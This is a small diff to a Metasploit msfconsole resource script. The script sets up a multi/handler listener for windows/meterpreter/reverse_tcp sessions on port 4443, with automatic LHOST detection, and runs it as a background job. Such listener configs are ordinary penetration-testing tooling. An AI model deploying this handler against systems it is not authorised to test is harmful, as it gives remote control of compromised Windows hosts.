@@ -1,16 +1,17 @@
-# RC script:  auto-multi/handler
+# msfconsole resource script to setup a multi-handler
+# $Name:  auto-multi/handler
+# $Author: kernelsmith
 
 use multi/handler
-setg PAYLOAD windows/meterpreter/reverse_tcp
-setg DisablePayloadHandler true
-
-<ruby>
-	run_single("set LHOST #{Rex::Socket.source_address("5.5.5.5")}")
-</ruby>
-
-# Or resource chain here
-set LPORT 8443
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LPORT 4443
 set ExitOnSession false
+
+# automatically figure out & set LHOST as best we can
+resource auto-LHOST
+
+# run it in the background
 exploit -j -z
+
 
 
